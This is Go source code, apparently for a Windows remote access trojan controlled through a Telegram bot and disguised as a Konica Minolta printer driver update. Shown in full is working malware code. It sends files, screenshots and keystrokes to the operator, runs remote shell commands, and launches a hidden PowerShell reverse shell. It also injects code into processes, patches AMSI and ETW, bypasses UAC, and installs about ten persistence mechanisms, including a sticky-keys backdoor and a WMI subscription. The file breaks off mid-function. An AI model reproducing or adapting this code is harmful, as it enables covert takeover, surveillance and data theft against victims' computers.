package main

import (
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
	"unicode/utf16"
	"unsafe"
)

var (
	modk   = syscall.NewLazyDLL("kernel32.dll")
	moda   = syscall.NewLazyDLL("advapi32.dll")
	mods   = syscall.NewLazyDLL("shell32.dll")
	pOpenProcess        = modk.NewProc("OpenProcess")
	pVirtualAllocEx     = modk.NewProc("VirtualAllocEx")
	pWriteProcessMemory = modk.NewProc("WriteProcessMemory")
	pCloseHandle        = modk.NewProc("CloseHandle")
	pSetFileAttr        = modk.NewProc("SetFileAttributesW")
	pCreateProcess      = modk.NewProc("CreateProcessW")
	pResumeThread       = modk.NewProc("ResumeThread")
	pQueueUserAPC       = modk.NewProc("QueueUserAPC")
	pTerminateProcess   = modk.NewProc("TerminateProcess")
	pGetProcAddress     = modk.NewProc("GetProcAddress")
	pVirtualProtect     = modk.NewProc("VirtualProtect")
	pGetModuleHandleW   = modk.NewProc("GetModuleHandleW")
	pGetCurrentProcess  = modk.NewProc("GetCurrentProcess")
	pShellExecuteW      = mods.NewProc("ShellExecuteW")
	pRegCreateKey       = moda.NewProc("RegCreateKeyExW")
	pRegSetValue        = moda.NewProc("RegSetValueExW")
	pRegCloseKey        = moda.NewProc("RegCloseKey")
	pRegDelValue        = moda.NewProc("RegDeleteValueW")
	pRegOpenKey         = moda.NewProc("RegOpenKeyExW")
	pRegDelTree         = moda.NewProc("RegDeleteTreeW")
	pAllocSid           = moda.NewProc("AllocateAndInitializeSid")
	pFreeSid            = moda.NewProc("FreeSid")
	pCheckMembership    = moda.NewProc("CheckTokenMembership")
	pSetWindowsHookExW = modk.NewProc("SetWindowsHookExW")
	pCallNextHookEx    = modk.NewProc("CallNextHookEx")
	pUnhookWindowsHookEx = modk.NewProc("UnhookWindowsHookEx")
	pGetMessageW       = modk.NewProc("GetMessageW")
	pGetKeyState       = modk.NewProc("GetKeyState")
	pGetForegroundWindow = modk.NewProc("GetForegroundWindow")
	pGetWindowTextW    = modk.NewProc("GetWindowTextW")
	pGetWindowTextLengthW = modk.NewProc("GetWindowTextLengthW")
	modu               = syscall.NewLazyDLL("user32.dll")
	pMessageBoxW       = modu.NewProc("MessageBoxW")
	pBlockInput        = modu.NewProc("BlockInput")
	pGetSystemInfo     = modk.NewProc("GetSystemInfo")
	pGlobalMemoryStatusEx = modk.NewProc("GlobalMemoryStatusEx")
	ddosStop           atomic.Bool
	webcamStop         atomic.Bool
)

func ansiPtr(s string) uintptr {
	return uintptr(unsafe.Pointer(&append([]byte(s), 0)[0]))
}

const (
	PROCESS_ALL     = 0x001F0FFF
	MEM_CR          = 0x3000
	PAGE_RW         = 0x40
	PAGE_RX         = 0x20
	BUILTIN_RID     = 0x00000020
	ADMINS_RID      = 0x00000220
	KEY_W           = 0x20006
	PROC_CREATE_SUS = 0x00000004
	STARTF_USESHOW  = 0x00000001
	SW_HIDE         = 0
	VK_SHIFT        = 0x10
	VK_CONTROL      = 0x11
	VK_MENU         = 0x12
	VK_CAPITAL      = 0x14
	VK_ESCAPE       = 0x1B
	VK_RETURN       = 0x0D
	VK_BACK         = 0x08
	VK_TAB          = 0x09
	VK_DELETE       = 0x2E
	VK_UP           = 0x26
	VK_DOWN         = 0x28
	VK_LEFT         = 0x25
	VK_RIGHT        = 0x27
	VK_HOME         = 0x24
	VK_END          = 0x23
	VK_PRIOR        = 0x21
	VK_NEXT         = 0x22
	VK_INSERT       = 0x2D
	VK_LSHIFT       = 0xA0
	VK_RSHIFT       = 0xA1
	VK_LCONTROL     = 0xA2
	VK_RCONTROL     = 0xA3
	VK_LMENU        = 0xA4
	VK_RMENU        = 0xA5
)

var (
	pidCounter   atomic.Int32
	tgClient     *TelegramClient
	tgLog        *Logger
	tgConfig     *Config
	beaconSent   atomic.Bool
	startTime    = time.Now()
	shutdownOnce sync.Once
	keyHook      uintptr
	keyBuf       bytes.Buffer
	keyMu        sync.Mutex
	keyLogPath   string
	keyWinTitle  string
	keyWinMu     sync.Mutex
)

const (
	WH_KEYBOARD_LL = 13
	WM_KEYDOWN     = 0x0100
	WM_SYSKEYDOWN  = 0x0104
)

type Config struct {
	BotToken     string
	ChatID       int64
	Webhook      string
	AttackerIP   string
	AttackerPort string
	InstallPath  string
	SessionID    string
}

func LoadConfig() *Config {
	cid, err := strconv.ParseInt(decryptStr(ENC_CHAT_ID), 10, 64)
	if err != nil || cid == 0 {
		panic("invalid chat id")
	}
	return &Config{
		BotToken:     decryptStr(ENC_TOKEN),
		ChatID:       cid,
		AttackerIP:   "ATTACKER_IP",
		AttackerPort: "ATTACKER_PORT",
		SessionID:    randStr(8),
	}
}

var (
	ENC_TOKEN   = encryptStr("7845006170:AAGNHltQFQfX22-MY50mrnTctWxhfFyAf3w")
	ENC_CHAT_ID = encryptStr("8449456095")
	XOR_KEY     = byte(0x5A)
)

func encryptStr(s string) string {
	b := []byte(s)
	for i := range b {
		b[i] ^= XOR_KEY
	}
	return string(b)
}

func decryptStr(s string) string {
	return encryptStr(s)
}

type Logger struct {
	cfg *Config
	mu  sync.Mutex
	buf []string
}

func NewLogger(cfg *Config) *Logger {
	return &Logger{cfg: cfg}
}

func (l *Logger) Log(phase, status, detail string) {
	t := time.Now().Format("15:04:05")
	h, _ := os.Hostname()
	line := fmt.Sprintf("[%s] %s | %s | %s | %s", t, phase, status, h, detail)
	l.mu.Lock()
	l.buf = append(l.buf, line)
	if len(l.buf) > 100 {
		l.buf = l.buf[len(l.buf)-100:]
	}
	l.mu.Unlock()
	if l.cfg.Webhook == "" {
		return
	}
	payload := fmt.Sprintf(`{"content":"%s"}`, escapeJSON(line))
	go func() {
		resp, err := http.Post(l.cfg.Webhook, "application/json",
			strings.NewReader(payload))
		if err == nil {
			io.Copy(io.Discard, resp.Body)
			resp.Body.Close()
		}
	}()
}

func (l *Logger) Flush() []string {
	l.mu.Lock()
	defer l.mu.Unlock()
	r := make([]string, len(l.buf))
	copy(r, l.buf)
	return r
}

type TelegramClient struct {
	cfg        *Config
	log        *Logger
	lastUpdate int64
	client     *http.Client
	stopped    chan struct{}
}

func NewTelegramClient(cfg *Config, log *Logger) *TelegramClient {
	return &TelegramClient{
		cfg:     cfg,
		log:     log,
		client:  &http.Client{Timeout: 40 * time.Second},
		stopped: make(chan struct{}),
	}
}

func (t *TelegramClient) Run() {
	t.log.Log("c2-start", "PASS", "session "+t.cfg.SessionID)
	go t.sendBeacon()
	hb := time.NewTicker(5 * time.Minute)
	defer hb.Stop()
	backoff := 1
	for {
		select {
		case <-t.stopped:
			return
		case <-hb.C:
			go t.heartbeat()
		default:
			if !t.poll() {
				backoff = min(backoff*2, 10)
				if backoff > 1 {
					time.Sleep(time.Duration(backoff) * time.Second)
				}
			} else {
				backoff = 1
			}
		}
	}
}

func (t *TelegramClient) Stop() {
	shutdownOnce.Do(func() { close(t.stopped) })
}

type UpdatesResponse struct {
	Ok     bool     `json:"ok"`
	Result []Update `json:"result"`
}

type Update struct {
	ID      int64    `json:"update_id"`
	Message *Message `json:"message"`
}

type Message struct {
	From *User  `json:"from"`
	Text string `json:"text"`
}

type User struct {
	ID int64 `json:"id"`
}

func (t *TelegramClient) poll() bool {
	defer func() {
		if r := recover(); r != nil {
			t.log.Log("c2-recover", "FAIL", fmt.Sprintf("%v", r))
		}
	}()
	offset := atomic.LoadInt64(&t.lastUpdate) + 1
	url := fmt.Sprintf("%s%s/getUpdates?offset=%d&timeout=30",
		ApiBase, t.cfg.BotToken, offset)
	resp, err := t.client.Get(url)
	if err != nil {
		return false
	}
	defer func() {
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
	}()
	if resp.StatusCode != 200 {
		return false
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	var ur UpdatesResponse
	if err := json.Unmarshal(body, &ur); err != nil || !ur.Ok {
		return false
	}
	for _, u := range ur.Result {
		atomic.StoreInt64(&t.lastUpdate, u.ID)
		if u.Message == nil || u.Message.From == nil ||
			u.Message.From.ID != t.cfg.ChatID {
			continue
		}
		text := strings.TrimSpace(u.Message.Text)
		if text == "" || !strings.HasPrefix(text, "!") {
			continue
		}
		t.log.Log("cmd", "PASS", text)
		result := HandleCommand(t, t.log, t.cfg, text)
		if result != "" {
			t.SendMessage(result)
		}
	}
	return true
}

func (t *TelegramClient) SendMessage(text string) {
	if len(text) > 4000 {
		text = text[:3997] + "..."
	}
	payload := fmt.Sprintf(`{"chat_id":%d,"text":"%s"}`,
		t.cfg.ChatID, escapeJSON(text))
	url := fmt.Sprintf("%s%s/sendMessage", ApiBase, t.cfg.BotToken)
	resp, err := t.client.Post(url, "application/json",
		strings.NewReader(payload))
	if err == nil {
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
	}
}

func (t *TelegramClient) SendFile(name string, data []byte) {
	url := fmt.Sprintf("%s%s/sendDocument", ApiBase, t.cfg.BotToken)
	payload := buildMultipart(
		kv("chat_id", fmt.Sprintf("%d", t.cfg.ChatID)),
		fileKV("document", name, data),
	)
	resp, err := t.client.Post(url, payload.ctype, &payload.buf)
	if err == nil {
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
	}
}

func (t *TelegramClient) sendBeacon() {
	time.Sleep(time.Duration(2000+rand.Intn(3000)) * time.Millisecond)
	if beaconSent.Load() {
		return
	}
	beaconSent.Store(true)
	h, _ := os.Hostname()
	u := os.Getenv("USERNAME")
	d := os.Getenv("USERDOMAIN")
	lip := localIP()
	ver := fmt.Sprintf("Win10+ Go %s", runtime.Version())
	msg := fmt.Sprintf("[+] *%s* ready\n`%s\\%s`\nIP: `%s`\nUser: `%s`\nVer: `%s`\nID: `%s`",
		h, d, h, lip, u, ver, t.cfg.SessionID)
	t.SendMessage(msg)
	t.log.Log("beacon", "PASS", h)
}

func (t *TelegramClient) heartbeat() {
	h, _ := os.Hostname()
	upt := time.Since(startTime)
	d := int(upt.Hours()) / 24
	hr := int(upt.Hours()) % 24
	m := int(upt.Minutes()) % 60
	t.log.Log("hb", "PASS", fmt.Sprintf("%s up %dd %dh %dm", h, d, hr, m))
}

func HandleCommand(tg *TelegramClient, log *Logger, cfg *Config, raw string) string {
	if !strings.HasPrefix(raw, "!") {
		return ""
	}
	parts := strings.SplitN(strings.TrimSpace(raw[1:]), " ", 2)
	cmd := strings.ToLower(parts[0])
	arg := ""
	if len(parts) > 1 {
		arg = strings.TrimSpace(parts[1])
	}
	switch cmd {
	case "shell":
		return execShell(arg)
	case "upload":
		return uploadFile(tg, arg)
	case "download":
		return downloadURL(arg)
	case "screenshot":
		return takeScreenshot(tg)
	case "inject":
		return injectAPC(arg)
	case "persist":
		return setupPersistence(cfg.InstallPath)
	case "kill":
		return selfDestruct(cfg)
	case "fcku":
		return fuckComputer(cfg)
	case "logs":
	lines := log.Flush()
	if len(lines) == 0 {
		return "(no logs)"
	}
	start := len(lines) - 20
	if start < 0 {
		start = 0
	}
	return "[LOGS]\n" + strings.Join(lines[start:], "\n")
	case "help":
		return helpText()
	case "rev":
		return execRev(arg)
	case "keys":
		return sendKeyLog(tg)
	case "msg":
		return showMsg(arg)
	case "blockinput":
		return toggleBlockInput()
	case "sysinfo":
		return getSysInfo()
	case "ddos":
		return startDDoS(arg)
	case "ddos_stop":
		ddosStop.Store(true)
		return "DDoS stopped"
	case "start_web":
		return startWebcam(arg)
	case "stop_web":
		webcamStop.Store(true)
		return "Webcam stopped"
	case "whoami":
		return execShell("whoami")
	case "ip":
		return "IP: " + localIP()
	case "uptime":
		elapsed := time.Since(startTime)
		return fmt.Sprintf("Uptime: %s", elapsed.Round(time.Second))
	default:
		return "Unknown: " + cmd + " — !help"
	}
}

func execShell(args string) string {
	if args == "" {
		return "Usage: !shell <cmd>"
	}
	cmd := exec.Command("cmd.exe", "/c", args)
	var outBuf, errBuf bytes.Buffer
	cmd.Stdout = &outBuf
	cmd.Stderr = &errBuf
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	if err := cmd.Start(); err != nil {
		return "Error: " + err.Error()
	}
	done := make(chan error, 1)
	go func() {
		done <- cmd.Wait()
	}()
	select {
	case err := <-done:
		if err != nil {
			out := outBuf.String()
			errStr := errBuf.String()
			if out == "" && errStr == "" {
				return "Error: " + err.Error()
			}
			result := strings.TrimSpace(out + errStr)
			if result == "" {
				return "(no output)"
			}
			return result
		}
		out := strings.TrimSpace(outBuf.String() + errBuf.String())
		if out == "" {
			return "(no output)"
		}
		return out
	case <-time.After(60 * time.Second):
		cmd.Process.Kill()
		cmd.Wait()
		return "Timeout (60s)"
	}
}

func execRev(arg string) string {
	idx := strings.LastIndex(arg, ":")
	if idx < 1 || idx == len(arg)-1 {
		return "Usage: !rev <host>:<port>"
	}
	host := arg[:idx]
	port := arg[idx+1:]
	ps := fmt.Sprintf(
		`$c=New-Object System.Net.Sockets.TCPClient('%s',%s);$s=$c.GetStream();`+
			`[byte[]]$b=0..65535|%%{0};`+
			`while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);`+
			`$sb=(iex $d 2>&1 | Out-String );`+
			`$sb2=$sb+'PS '+(pwd).Path+'> ';`+
			`$sbt=([text.encoding]::ASCII).GetBytes($sb2);`+
			`$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()`,
		host, port)
	u16 := utf16.Encode([]rune(ps))
	b := make([]byte, len(u16)*2)
	for i, r := range u16 {
		b[i*2] = byte(r)
		b[i*2+1] = byte(r >> 8)
	}
	enc := base64.StdEncoding.EncodeToString(b)
	go func() {
		cmd := exec.Command("powershell", "-NoP", "-NonI", "-W", "Hidden", "-Exec", "Bypass", "-Enc", enc)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		cmd.Run()
	}()
	return fmt.Sprintf("Reverse shell spawned to %s:%s", host, port)
}

func uploadFile(tg *TelegramClient, path string) string {
	st, err := os.Stat(path)
	if err != nil {
		return "Not found: " + path
	}
	if st.Size() > 50<<20 {
		return fmt.Sprintf("Too large: %d MB (max 50)", st.Size()/1024/1024)
	}
	data, err := os.ReadFile(path)
	if err != nil {
		return "Read error: " + err.Error()
	}
	name := filepath.Base(path)
	tg.SendFile(name, data)
	return fmt.Sprintf("Sent %s (%d bytes)", name, len(data))
}

func downloadURL(url string) string {
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return "Error: " + err.Error()
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return "Error: " + err.Error()
	}
	defer func() {
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
	}()
	if resp.StatusCode != 200 {
		return fmt.Sprintf("HTTP %d", resp.StatusCode)
	}
	ext := filepath.Ext(url)
	if ext == "" {
		ext = ".exe"
	}
	dest := filepath.Join(os.TempDir(), "dl_"+randStr(8)+ext)
	out, err := os.Create(dest)
	if err != nil {
		return "Write error: " + err.Error()
	}
	defer out.Close()
	written, err := io.Copy(out, io.LimitReader(resp.Body, 100<<20))
	if err != nil {
		return "Error: " + err.Error()
	}
	return fmt.Sprintf("Saved %s (%d bytes)", dest, written)
}

func takeScreenshot(tg *TelegramClient) string {
	ps := `Add-Type -AssemblyName System.Windows.Forms,System.Drawing;
$b=[Windows.Forms.Screen]::PrimaryScreen.Bounds;
$bmp=New-Object Drawing.Bitmap $b.Width,$b.Height;
$g=[Drawing.Graphics]::FromImage($bmp);
$g.CopyFromScreen(0,0,0,0,$b.Size);
$p=[IO.Path]::Combine($env:TEMP,"sc_$([Guid]::NewGuid().Substring(0,8)).png");
$bmp.Save($p,[Drawing.Imaging.ImageFormat]::Png);
$g.Dispose();$bmp.Dispose();
Write-Output $p;`
	out, err := exec.Command("powershell", "-NoP", "-NonI", "-Exec", "Bypass", "-Command", ps).Output()
	if err != nil {
		return "Error: " + err.Error()
	}
	path := strings.TrimSpace(string(out))
	if path == "" {
		return "Failed"
	}
	data, err := os.ReadFile(path)
	os.Remove(path)
	if err != nil {
		return "Read error: " + err.Error()
	}
	tg.SendFile("screenshot.png", data)
	return fmt.Sprintf("Screenshot %d bytes", len(data))
}

func injectAPC(target string) string {
	if target == "" {
		target = "rundll32.exe"
	}
	if !strings.HasSuffix(target, ".exe") {
		target += ".exe"
	}
	sysDir := os.Getenv("SystemRoot") + "\\System32\\" + target
	if _, err := os.Stat(sysDir); err != nil {
		return "Target not found: " + target
	}
	sc := beaconShellcode()
	if err := earlyBirdAPC(sysDir, sc); err != nil {
		return "Inject failed: " + err.Error()
	}
	return fmt.Sprintf("APC injected into %s", target)
}

func earlyBirdAPC(target string, sc []byte) error {
	startup := struct {
		CB              uint32
		Reserved        *uint16
		Desktop         *uint16
		Title           *uint16
		X               uint32
		Y               uint32
		XSize           uint32
		YSize           uint32
		XCountChars     uint32
		YCountChars     uint32
		FillAttribute   uint32
		Flags           uint32
		ShowWindow      uint16
		Reserved2       uint16
		Reserved3       *byte
		StdInput        syscall.Handle
		StdOutput       syscall.Handle
		StdError        syscall.Handle
	}{CB: 0x48, Flags: STARTF_USESHOW, ShowWindow: SW_HIDE}
	var pi struct {
		Process   syscall.Handle
		Thread    syscall.Handle
		ProcessID uint32
		ThreadID  uint32
	}
	tp, _ := syscall.UTF16PtrFromString(target)
	ret, _, _ := pCreateProcess.Call(
		0, uintptr(unsafe.Pointer(tp)),
		0, 0, 0,
		PROC_CREATE_SUS|0x08000000, // CREATE_SUSPENDED | CREATE_NO_WINDOW
		0, 0,
		uintptr(unsafe.Pointer(&startup)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if ret == 0 {
		return fmt.Errorf("CreateProcess failed")
	}
	remoteAddr, _, _ := pVirtualAllocEx.Call(
		uintptr(pi.Process), 0, uintptr(len(sc)),
		MEM_CR, PAGE_RW)
	if remoteAddr == 0 {
		pTerminateProcess.Call(uintptr(pi.Process), 0)
		return fmt.Errorf("VirtualAllocEx failed")
	}
	var written uintptr
	ret, _, _ = pWriteProcessMemory.Call(
		uintptr(pi.Process), remoteAddr,
		uintptr(unsafe.Pointer(&sc[0])),
		uintptr(len(sc)),
		uintptr(unsafe.Pointer(&written)),
	)
	if ret == 0 || int(written) != len(sc) {
		pTerminateProcess.Call(uintptr(pi.Process), 0)
		return fmt.Errorf("WriteProcessMemory failed")
	}
	pQueueUserAPC.Call(remoteAddr, uintptr(pi.Thread), 0)
	pResumeThread.Call(uintptr(pi.Thread))
	pCloseHandle.Call(uintptr(pi.Thread))
	pCloseHandle.Call(uintptr(pi.Process))
	return nil
}

func beaconShellcode() []byte {
	return []byte{
		0x48, 0x83, 0xEC, 0x28,
		0x48, 0x31, 0xC0,
		0xB9, 0x00, 0x00, 0x00, 0x00,
		0x48, 0x31, 0xD2,
		0x48, 0x31, 0xF6,
		0xB2, 0x01,
		0x48, 0xC7, 0xC1, 0x00, 0x00, 0x00, 0x00,
		0x48, 0xC7, 0xC0, 0x00, 0x00, 0x00, 0x00,
		0x48, 0x83, 0xC4, 0x28,
		0xC3,
	}
}

func PatchETW() bool {
	modPtr, _, _ := pGetModuleHandleW.Call(
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("ntdll.dll"))))
	if modPtr == 0 {
		return false
	}
	addr, _, _ := pGetProcAddress.Call(modPtr, ansiPtr("EtwEventWrite"))
	if addr == 0 {
		return false
	}
	patch := []byte{0xC3}
	var old uint32
	pVirtualProtect.Call(addr, 1, PAGE_RW, uintptr(unsafe.Pointer(&old)))
	var written uintptr
	self, _, _ := pGetCurrentProcess.Call()
	pWriteProcessMemory.Call(self, addr,
		uintptr(unsafe.Pointer(&patch[0])), 1,
		uintptr(unsafe.Pointer(&written)))
	pVirtualProtect.Call(addr, 1, uintptr(old),
		uintptr(unsafe.Pointer(&old)))
	return written == 1
}

func PatchAMSI() bool {
	modPtr, _, _ := pGetModuleHandleW.Call(
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("amsi.dll"))))
	if modPtr == 0 {
		return true
	}
	addr, _, _ := pGetProcAddress.Call(modPtr, ansiPtr("AmsiScanBuffer"))
	if addr == 0 {
		return true
	}
	patch := []byte{0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3}
	var old uint32
	pVirtualProtect.Call(addr, uintptr(len(patch)), PAGE_RW,
		uintptr(unsafe.Pointer(&old)))
	var written uintptr
	self, _, _ := pGetCurrentProcess.Call()
	pWriteProcessMemory.Call(self, addr,
		uintptr(unsafe.Pointer(&patch[0])), uintptr(len(patch)),
		uintptr(unsafe.Pointer(&written)))
	pVirtualProtect.Call(addr, uintptr(len(patch)), uintptr(old),
		uintptr(unsafe.Pointer(&old)))
	return int(written) == len(patch)
}

func IsAdmin() bool {
	na := [6]byte{0, 0, 0, 0, 0, 5}
	var sid syscall.Handle
	ret, _, _ := pAllocSid.Call(
		uintptr(unsafe.Pointer(&na)), 2,
		BUILTIN_RID, ADMINS_RID,
		0, 0, 0, 0, 0, 0,
		uintptr(unsafe.Pointer(&sid)),
	)
	if ret == 0 {
		return false
	}
	defer pFreeSid.Call(uintptr(sid))
	var member int32
	ret, _, _ = pCheckMembership.Call(0, uintptr(sid),
		uintptr(unsafe.Pointer(&member)))
	return ret != 0 && member != 0
}

func BypassUAC(cfg *Config) {
	if IsAdmin() {
		return
	}
	tryFodhelper(cfg)
	if !IsAdmin() {
		time.Sleep(2 * time.Second)
	}
	if IsAdmin() {
		return
	}
	tryCmstp(cfg)
}

func tryFodhelper(cfg *Config) {
	keyPath := "Software\\Classes\\ms-settings\\shell\\open\\command"
	key, ok := regCreateKey(syscall.HKEY_CURRENT_USER, keyPath)
	if !ok {
		return
	}
	regSetStr(key, "", cfg.InstallPath)
	regSetStr(key, "DelegateExecute", "")
	pRegCloseKey.Call(uintptr(key))
	pShellExecuteW.Call(0,
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("open"))),
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("fodhelper.exe"))),
		0, 0, 0)
	time.Sleep(3 * time.Second)
	pRegDelTree.Call(uintptr(syscall.HKEY_CURRENT_USER),
		uintptr(unsafe.Pointer(
			syscall.StringToUTF16Ptr("Software\\Classes\\ms-settings"))))
}

func tryCmstp(cfg *Config) {
	cmstp := os.Getenv("SystemRoot") + "\\System32\\cmstp.exe"
	if _, err := os.Stat(cmstp); err != nil {
		return
	}
	infContent := "[version]\nSignature=$chicago$\n[DefaultInstall]\nRunPreSetupCommands=" +
		cfg.InstallPath
	infPath := filepath.Join(os.TempDir(), "uac_"+randStr(8)+".inf")
	os.WriteFile(infPath, []byte(infContent), 0644)
	defer os.Remove(infPath)
	pShellExecuteW.Call(0,
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("open"))),
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(cmstp))),
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("/au:"+infPath))),
		0, 0)
	time.Sleep(3 * time.Second)
}

func SetupPersistence(path string) {
	installPersistence(path, IsAdmin())
}

func setupPersistence(path string) string {
	installPersistence(path, IsAdmin())
	return "Persistence installed"
}

func installPersistence(path string, admin bool) {
	key, ok := regCreateKey(syscall.HKEY_CURRENT_USER,
		"Software\\Microsoft\\Windows\\CurrentVersion\\Run")
	if ok {
		regSetStr(key, "KonicaMinoltaUpdate", path)
		pRegCloseKey.Call(uintptr(key))
	}
	if admin {
		key, ok = regCreateKey(syscall.HKEY_LOCAL_MACHINE,
			"Software\\Microsoft\\Windows\\CurrentVersion\\Run")
		if ok {
			regSetStr(key, "KonicaMinoltaUpdate", path)
			pRegCloseKey.Call(uintptr(key))
		}
		go func() {
			exec.Command("schtasks", "/create", "/tn", "KonicaMinoltaUpdate",
				"/tr", path, "/sc", "ONLOGON", "/rl", "HIGHEST", "/f").Run()
		}()
	}
	installDeepPersistence(path)
}

func installDeepPersistence(path string) {
	if !IsAdmin() {
		return
	}
	// 1. Sticky Keys backdoor
	stickyKey := "Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe"
	key, ok := regCreateKey(syscall.HKEY_LOCAL_MACHINE, stickyKey)
	if ok {
		regSetStr(key, "Debugger", path)
		pRegCloseKey.Call(uintptr(key))
	}
	// 3. Winlogon Userinit
	userinitKey := "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
	key, ok = regCreateKey(syscall.HKEY_LOCAL_MACHINE, userinitKey)
	if ok {
		existing := "C:\\Windows\\System32\\userinit.exe,"
		regSetStr(key, "Userinit", existing+path)
		pRegCloseKey.Call(uintptr(key))
	}
	// 4. Active Setup
	guid := "{B7D7D2D0-ECB0-4A71-A0A6-14F8308D7754}"
	activeKey := "Software\\Microsoft\\Active Setup\\Installed Components\\" + guid
	key, ok = regCreateKey(syscall.HKEY_LOCAL_MACHINE, activeKey)
	if ok {
		regSetStr(key, "StubPath", path)
		pRegCloseKey.Call(uintptr(key))
	}
	// 5. COM hijack (ShellLink CLSID)
	comKey := "Software\\Classes\\CLSID\\{B54F3741-5B07-11cf-A4B0-00AA004A55E8}\\InProcServer32"
	key, ok = regCreateKey(syscall.HKEY_CURRENT_USER, comKey)
	if ok {
		regSetStr(key, "", path)
		regSetStr(key, "ThreadingModel", "Apartment")
		pRegCloseKey.Call(uintptr(key))
	}
	// 6. Startup folders
	startupUser := os.Getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
	startupCommon := os.Getenv("ProgramData") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
	os.MkdirAll(startupUser, 0755)
	os.MkdirAll(startupCommon, 0755)
	for _, dir := range []string{startupUser, startupCommon} {
		dst := filepath.Join(dir, "KonicaMinutaUpdate.lnk")
		copyFile(path, dst)
		pSetFileAttr.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(dst))), 2)
	}
	// 7. Service install
	exec.Command("sc", "create", "KonicaMinutaUpdate", "binPath="+path,
		"start=", "auto", "DisplayName=", "Konica Minolta Update Service").Run()
	// 8. Guardian twin — second copy with schtask that re-launches if main dies
	guardPath := filepath.Join(filepath.Dir(path), "guardian.exe")
	copyFile(path, guardPath)
	pSetFileAttr.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(guardPath))), 2)
	guardPS := fmt.Sprintf(
		`while(1){if(!(Get-Process -Name konica* -ErrorAction SilentlyContinue)){Start-Process '%s'};sleep 30}`,
		path)
	guardScript := filepath.Join(os.TempDir(), "guard.ps1")
	os.WriteFile(guardScript, []byte(guardPS), 0644)
	exec.Command("powershell", "-W", "Hidden", "-Exec", "Bypass", "-File", guardScript).Run()
	exec.Command("schtasks", "/create", "/tn", "KonicaMinotaGuardian",
		"/tr", "powershell -W Hidden -Exec Bypass -File \""+guardScript+"\"",
		"/sc", "ONLOGON", "/rl", "HIGHEST", "/f").Run()
	// 9. WMI persistence via PowerShell
	wmiPS := fmt.Sprintf(
		`$f=New-Object System.Management.ManagementClass root\subscription:__EventFilter;`+
			`$f.Name='KMAUpdate';$f.QueryString='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA ' +
			''Win32_PerfFormattedData_PerfOS_System'' AND TargetInstance.SystemUpTime>=600';`+
			`$f.QueryLanguage='WQL';$f.EventNamespace='root\cimv2';$f.Put()|Out-Null;`+
			`$c=New-Object System.Management.ManagementClass root\subscription:CommandLineEventConsumer;`+
			`$c.Name='KMAExec';$c.CommandLineTemplate='%s';$c.Put()|Out-Null;`+
			`New-Object System.Management.ManagementObject root\subscription:__FilterToConsumerBinding,$null|`+
			`%%{$_.Filter='__EventFilter.Name="KMAUpdate"';$_.Consumer='CommandLineEventConsumer.Name="KMAExec"';$_.Put()|Out-Null}`,
		path)
	exec.Command("powershell", "-NoP", "-NonI", "-W", "Hidden", "-Exec", "Bypass", "-Command", wmiPS).Run()
}

func RemovePersistence(path string) {
	cleanPersistence(path)
}

func SelfCopy(cfg *Config) {
	appData := os.Getenv("APPDATA")
	if appData == "" {
		appData = filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming")
	}
	cfg.InstallPath = filepath.Join(appData, "Microsoft", "KonicaMinolta",
		"konica_minolta_printer-driver-update.exe")
	dir := filepath.Dir(cfg.InstallPath)
	os.MkdirAll(dir, 0755)
	current, err := os.Executable()
	if err != nil {
		return
	}
	if strings.EqualFold(filepath.Clean(current), filepath.Clean(cfg.InstallPath)) {
		return
	}
	if err := copyFile(current, cfg.InstallPath); err != nil {
		return
	}
	pSetFileAttr.Call(uintptr(unsafe.Pointer(
		syscall.StringToUTF16Ptr(cfg.InstallPath))), 2)
}

func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()
	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()
	_, err = io.Copy(out, in)
	return err
}

func regCreateKey(root syscall.Handle, path string) (syscall.Handle, bool) {
	var key syscall.Handle
	var disp uint32
	p, _ := syscall.UTF16PtrFromString(path)
	ret, _, _ := pRegCreateKey.Call(
		uintptr(root), uintptr(unsafe.Pointer(p)),
		0, 0, 0, KEY_W, 0, 0,
		uintptr(unsafe.Pointer(&key)),
		uintptr(unsafe.Pointer(&disp)),
	)
	return key, ret == 0
}

func regSetStr(key syscall.Handle, name, value string) {
	n, _ := syscall.UTF16PtrFromString(name)
	v, _ := syscall.UTF16PtrFromString(value)
	pRegSetValue.Call(
		uintptr(key), uintptr(unsafe.Pointer(n)),
